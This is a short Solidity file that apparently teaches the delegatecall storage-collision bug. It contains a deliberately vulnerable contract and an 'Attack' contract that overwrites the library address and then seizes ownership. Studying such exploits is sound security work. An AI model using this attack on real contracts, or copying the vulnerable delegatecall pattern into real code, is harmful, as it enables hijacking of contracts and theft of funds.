pragma solidity ^0.8.13;

contract Liberary {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract Vulnerable {
    address public owner;
    address public lib;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    
    address public lib;
    address public owner;
    uint public someNumber;

    Vulnerable public vulnerable;

    constructor(Vulnerable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    function attack() public {
        // override address of lib
        vulnerable.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        //vulnerable.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
